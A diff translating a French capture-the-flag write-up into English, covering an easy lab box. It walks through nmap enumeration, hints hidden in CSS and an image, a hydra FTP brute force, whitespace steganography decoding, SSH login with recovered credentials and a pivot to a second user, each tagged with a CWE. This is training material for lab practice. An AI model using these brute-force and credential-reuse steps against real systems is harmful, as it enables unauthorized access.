@@ -1,248 +1,248 @@
 # Write-up : "Musa Troglodytarum"
 
-**Cible :** 10.10.0.X (vhost `viridiancity.epi`, l'IP change à chaque redéploiement)
+**Target:** 10.10.0.X (vhost `viridiancity.epi`, the IP changes on every redeploy)
 
-**Objectif :** Obtenir user.txt
+**Objective:** Get user.txt
 
-**Difficulté :** Easy
+**Difficulty:** Easy
 
-**Date :** 21/09/2026
+**Date:** 21/09/2026
 
-**Techniques :** énumération web, indice caché dans le CSS, redirection HTTP, directory listing, `strings` sur une image, brute force FTP, stéganographie espaces/tabulations, réutilisation d'identifiants, pivot entre utilisateurs
+**Techniques:** web enumeration, hint hidden in CSS, HTTP redirection, directory listing, `strings` on an image, FTP brute force, space/tab steganography, credential reuse, pivot between users
 
-**Outils :** nmap, curl, wget, strings, hydra, ftp, ssh, CyberChef
+**Tools:** nmap, curl, wget, strings, hydra, ftp, ssh, CyberChef
 
 ---
 
-## 1. Scan des ports
+## 1. Port scan
 
 ```bash
 nmap -sV 10.10.0.X
 ```
 
-Résultat : `21` (FTP), `22` (SSH), `80` (HTTP, page "It works").
+Result: `21` (FTP), `22` (SSH), `80` (HTTP, "It works" page).
 
-On ajoute le nom du site :
+We add the site name:
 
 ```bash
 echo "10.10.0.X viridiancity.epi" | sudo tee -a /etc/hosts
 ```
-Cette ligne dit à ta machine : « viridiancity.epi = cette IP ». `tee -a` = ajouter à la fin du fichier `/etc/hosts`.
+This line tells your machine: "viridiancity.epi = this IP". `tee -a` = append to the end of the `/etc/hosts` file.
 
 ---
 
-## 2. Un indice caché dans le CSS
+## 2. A hint hidden in the CSS
 
-La page d'accueil parle d'une « vidéo » : c'est un piège, on l'ignore. Le vrai indice est dans la feuille de style :
+The home page talks about a "video": it's a trap, we ignore it. The real hint is in the stylesheet:
 
 ```bash
 curl http://viridiancity.epi/assets/style.css
 ```
 
-En bas, un commentaire :
+At the bottom, a comment:
 
 ```
 Take a look at the page: /l3_B4n4N13r_D3s_M0nT4gN3s.php
 ```
 
-**Faille :** info sensible laissée dans un fichier annexe (CWE-200).
+**Vulnerability:** sensitive info left in a secondary file (CWE-200).
 
 ---
 
-## 3. Suivre la page cachée
+## 3. Following the hidden page
 
 ```bash
 curl -i http://viridiancity.epi/l3_B4n4N13r_D3s_M0nT4gN3s.php
 ```
-`-i` = affiche les en-têtes. La page vide renvoie une redirection.
+`-i` = displays the headers. The empty page returns a redirect.
 
-L'en-tête `Location:` révèle un dossier caché :
+The `Location:` header reveals a hidden folder:
 `/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3`
 
-**Faille :** chemin "secret" non protégé (CWE-425).
+**Vulnerability:** unprotected "secret" path (CWE-425).
 
 ---
 
-## 4. Récupérer l'image cachée
+## 4. Retrieving the hidden image
 
-Ouvre le dossier dans ton navigateur (ou avec curl) :
+Open the folder in your browser (or with curl):
 
 ```bash
 curl http://viridiancity.epi/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/
 ```
 
-Il contient `Hot_Babe.png`. Télécharge-le :
+It contains `Hot_Babe.png`. Download it:
 
 ```bash
 wget http://viridiancity.epi/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/Hot_Babe.png
 ```
 
-**Faille :** directory listing activé (CWE-548).
+**Vulnerability:** directory listing enabled (CWE-548).
 
 ---
 
-## 5. Lire le texte caché dans l'image
+## 5. Reading the hidden text in the image
 
 ```bash
 strings Hot_Babe.png
 ```
-`strings` affiche le texte lisible d'un fichier.
+`strings` displays the readable text of a file.
 
-Tout en bas :
+At the very bottom:
 
 ```
 Username for FTP is banane_celeste
 One of these is the password:
-(200 mots de passe)
+(200 passwords)
 ```
 
-Copie la liste de mots de passe dans un fichier `passwords.txt` (copier-coller, ou avec un éditeur).
+Copy the password list into a `passwords.txt` file (copy-paste, or with an editor).
 
-**Faille :** login et mots de passe cachés dans une image (CWE-200).
+**Vulnerability:** login and passwords hidden in an image (CWE-200).
 
 ---
 
-## 6. Brute force du FTP
+## 6. FTP brute force
 
 ```bash
 hydra -l banane_celeste -P passwords.txt -f ftp://10.10.0.X
 ```
-`-l` = le login, `-P` = la liste, `-f` = s'arrête dès qu'il trouve.
+`-l` = the login, `-P` = the list, `-f` = stops as soon as it finds one.
 
-Hydra affiche le bon mot de passe FTP.
+Hydra displays the correct FTP password.
 
-**Faille :** pas de protection contre le brute force (CWE-307).
+**Vulnerability:** no protection against brute force (CWE-307).
 
 ---
 
-## 7. Se connecter au FTP et prendre le fichier
+## 7. Connecting to FTP and grabbing the file
 
 ```bash
 ftp 10.10.0.X
 ```
-Puis dans le FTP :
+Then in the FTP session:
 ```
 Name: banane_celeste
-Password: <le mdp trouvé>
+Password: <the password found>
 ls
 get Valerian's_Creds.txt
 bye
 ```
-`ls` liste, `get` télécharge, `bye` quitte.
+`ls` lists, `get` downloads, `bye` quits.
 
-Regarde le fichier :
+Look at the file:
 ```bash
 cat -A Valerian's_Creds.txt
 ```
-`cat -A` montre les tabulations `^I` et les espaces : le fichier est plein de blancs, c'est un message caché.
+`cat -A` shows the tabs `^I` and spaces: the file is full of whitespace, it's a hidden message.
 
 ---
 
-## 8. Décoder la stéganographie (espaces/tabs) avec CyberChef
+## 8. Decoding the space/tab steganography with CyberChef
 
-Le contenu est du binaire caché : espace = 0, tabulation = 1, 8 bits = 1 lettre.
-Pas besoin de coder, on utilise CyberChef ([cyberchef.io](https://cyberchef.io)) :
+The content is hidden binary: space = 0, tab = 1, 8 bits = 1 letter.
+No need to code, we use CyberChef ([cyberchef.io](https://cyberchef.io)):
 
-1. Colle le contenu de `Valerian's_Creds.txt` dans Input.
-2. Dans la recette (Recipe), glisse :
-   - Find / Replace : chercher `\t` (mode Regex), remplacer par `1`
-   - Find / Replace : chercher ` ` (un espace), remplacer par `0`
+1. Paste the content of `Valerian's_Creds.txt` into Input.
+2. In the recipe, drag in:
+   - Find / Replace: search `\t` (Regex mode), replace with `1`
+   - Find / Replace: search ` ` (a space), replace with `0`
    - From Binary
-3. Le résultat s'affiche dans Output :
+3. The result shows up in Output:
 
 ```
 User: valerian
 Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP
 ```
 
-**Faille :** identifiants cachés par stéganographie (CWE-311).
+**Vulnerability:** credentials hidden by steganography (CWE-311).
 
 ---
 
-## 9. Connexion SSH en valerian
+## 9. SSH connection as valerian
 
 ```bash
 ssh valerian@10.10.0.X
 ```
-(mot de passe : `T4k_t4k_S0lide_Dyn0_int0_Cr1mP`)
+(password: `T4k_t4k_S0lide_Dyn0_int0_Cr1mP`)
 
-Le message d'accueil dit : « check our s3cr3t hiding place », c'est un indice.
+The welcome message says: "check our s3cr3t hiding place", it's a hint.
 
-**Faille :** réutilisation d'identifiants exposés (CWE-522).
+**Vulnerability:** reuse of exposed credentials (CWE-522).
 
 ---
 
-## 10. Trouver la cachette
+## 10. Finding the hiding place
 
-`user.txt` n'est pas dans le home. On cherche la « cachette » :
+`user.txt` isn't in the home directory. We look for the "hiding place":
 
 ```bash
 find / -iname "*s3cr3t*" 2>/dev/null
 ```
-`find` cherche partout ; `2>/dev/null` cache les erreurs de permission.
+`find` searches everywhere; `2>/dev/null` hides permission errors.
 
-Résultat : `/usr/games/s3cr3t/`. Il contient un fichier caché :
+Result: `/usr/games/s3cr3t/`. It contains a hidden file:
 
 ```bash
 cat /usr/games/s3cr3t/.msg_fr0m_v4l3r14n
 ```
 
-Message :
+Message:
 
 ```
 ... just a reminder ... "ca_serait_jamais_arrive_en_haskell" ...
    -Valerian
 ```
 
-Mot de passe de gabriel : `ca_serait_jamais_arrive_en_haskell`
+Gabriel's password: `ca_serait_jamais_arrive_en_haskell`
 
-**Faille :** mot de passe en clair dans un fichier (CWE-256).
+**Vulnerability:** plaintext password in a file (CWE-256).
 
 ---
 
-## 11. Devenir gabriel et lire le flag
+## 11. Becoming gabriel and reading the flag
 
 ```bash
 su gabriel
 ```
-(mot de passe : `ca_serait_jamais_arrive_en_haskell`)
+(password: `ca_serait_jamais_arrive_en_haskell`)
 
 ```bash
 cat ~/user.txt
 ```
 
-**FLAG :** `EPI{...}` (remplace par ta valeur)
+**FLAG:** `EPI{...}` (replace with your value)
 
 ---
 
-## Résumé des étapes
+## Summary of steps
 
-1. Commentaire CSS : la page `.php`.
-2. Cette page (302) : un dossier caché.
-3. Le dossier contient `Hot_Babe.png`.
-4. `strings` sur l'image : login FTP et liste de mots de passe.
-5. `hydra` : le mot de passe FTP.
-6. FTP : `Valerian's_Creds.txt` (espaces/tabs).
-7. CyberChef : mot de passe de valerian.
-8. SSH valerian, message caché : mot de passe de gabriel.
-9. `su gabriel` : `user.txt`.
+1. CSS comment: the `.php` page.
+2. That page (302): a hidden folder.
+3. The folder contains `Hot_Babe.png`.
+4. `strings` on the image: FTP login and password list.
+5. `hydra`: the FTP password.
+6. FTP: `Valerian's_Creds.txt` (spaces/tabs).
+7. CyberChef: valerian's password.
+8. SSH valerian, hidden message: gabriel's password.
+9. `su gabriel`: `user.txt`.
 
-## Failles exploitées
+## Exploited vulnerabilities
 
-| # | Faille | CWE |
+| # | Vulnerability | CWE |
 |---|--------|-----|
-| 1 | Indice dans un commentaire CSS | CWE-200 |
-| 2 | Chemin secret non protégé | CWE-425 |
-| 3 | Directory listing activé | CWE-548 |
-| 4 | Login et wordlist cachés dans une image | CWE-200 |
-| 5 | Pas d'anti-brute-force FTP | CWE-307 |
+| 1 | Hint in a CSS comment | CWE-200 |
+| 2 | Unprotected secret path | CWE-425 |
+| 3 | Directory listing enabled | CWE-548 |
+| 4 | Login and wordlist hidden in an image | CWE-200 |
+| 5 | No FTP anti-brute-force | CWE-307 |
 | 6 | Whitespace stego | CWE-311 |
-| 7 | Réutilisation d'identifiants | CWE-522 |
-| 8 | Mot de passe en clair dans un fichier | CWE-256 |
+| 7 | Credential reuse | CWE-522 |
+| 8 | Plaintext password in a file | CWE-256 |
 
-## À retenir
-- Toujours lire les fichiers annexes (CSS, commentaires) : l'indice y était.
-- Un `curl` qui n'affiche rien = une redirection, refais avec `-i`.
-- `strings` révèle le texte caché dans une image.
-- Un fichier plein d'espaces/tabs = du binaire : CyberChef (space=0, tab=1, From Binary), aucun code nécessaire.
-- La « vidéo » est un piège volontaire.
+## Key takeaways
+- Always read secondary files (CSS, comments): the hint was there.
+- A `curl` that shows nothing = a redirect, redo it with `-i`.
+- `strings` reveals text hidden in an image.
+- A file full of spaces/tabs is binary: CyberChef (space=0, tab=1, From Binary), no code needed.
+- The "video" is a deliberate trap.
